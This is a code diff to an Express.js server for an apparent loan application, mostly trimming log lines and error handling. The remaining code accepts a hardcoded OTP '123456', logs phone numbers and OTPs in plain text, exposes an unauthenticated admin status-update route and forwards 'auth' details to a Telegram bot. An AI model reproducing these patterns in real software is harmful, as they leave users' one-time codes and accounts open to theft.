@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// CORS
+// ─── CORS ───
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -77,9 +77,6 @@ app.post('/api/telegram/send-auth', async (req, res) => {
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
     
-    console.log('🔑 Token:', token ? '✅ Present' : '❌ Missing');
-    console.log('📱 Chat ID:', chatId ? '✅ Present' : '❌ Missing');
-    
     if (!token || !chatId) {
       console.log('⚠️ Telegram credentials missing');
       return res.json({ success: false, message: 'Telegram not configured' });
@@ -93,7 +90,6 @@ app.post('/api/telegram/send-auth', async (req, res) => {
                     `<b>Loan ID:</b> ${loanId || 'N/A'}`;
     
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    console.log('📤 Sending to Telegram...');
     
     const response = await fetch(url, {
       method: 'POST',
@@ -127,18 +123,15 @@ app.post('/api/loans/verify-otp', async (req, res) => {
   try {
     const { loanId, otp, phone } = req.body;
     
-    // Validate required fields
     if (!loanId || !otp || !phone) {
-      console.log('❌ Missing fields:', { loanId: !!loanId, otp: !!otp, phone: !!phone });
       return res.status(400).json({ 
         success: false, 
-        message: 'Missing required fields: loanId, otp, or phone' 
+        message: 'Missing required fields' 
       });
     }
     
-    console.log(`🔐 Verifying OTP for ${phone} (${loanId}): ${otp}`);
+    console.log(`🔐 Verifying OTP for ${phone}: ${otp}`);
     
-    // Simple OTP check - for demo, accept 123456
     if (otp === '123456') {
       console.log('✅ OTP verified successfully');
       return res.json({ 
@@ -154,10 +147,10 @@ app.post('/api/loans/verify-otp', async (req, res) => {
     }
     
   } catch (error) {
-    console.error('❌ OTP verification error:', error);
+    console.error('❌ OTP error:', error);
     return res.status(500).json({ 
       success: false, 
-      message: 'Server error during OTP verification' 
+      message: 'Server error' 
     });
   }
 });
@@ -168,16 +161,10 @@ app.put('/api/admin/update-status/:id', async (req, res) => {
   const { status } = req.body;
   console.log(`📝 Update loan ${id} to ${status}`);
   
-  try {
-    res.json({ 
-      success: true, 
-      message: `Loan ${id} updated to ${status}`,
-      loan: { id, status }
-    });
-  } catch (error) {
-    console.error('Update error:', error);
-    res.status(500).json({ success: false, message: 'Server error' });
-  }
+  res.json({ 
+    success: true, 
+    message: `Loan ${id} updated to ${status}`
+  });
 });
 
 // ─── RESEND OTP ───
@@ -185,14 +172,13 @@ app.post('/api/loans/resend-otp', async (req, res) => {
   const { loanId, phone } = req.body;
   console.log(`📱 Resend OTP for ${phone} (${loanId})`);
   
-  try {
-    const newOtp = String(Math.floor(100000 + Math.random() * 900000));
-    console.log(`📱 New OTP: ${newOtp}`);
-    res.json({ success: true, message: 'OTP resent successfully!' });
-  } catch (error) {
-    console.error('Resend error:', error);
-    res.status(500).json({ success: false, message: 'Server error' });
-  }
+  const newOtp = String(Math.floor(100000 + Math.random() * 900000));
+  console.log(`📱 New OTP: ${newOtp}`);
+  
+  res.json({ 
+    success: true, 
+    message: 'OTP resent successfully!' 
+  });
 });
 
 // ─── START ───
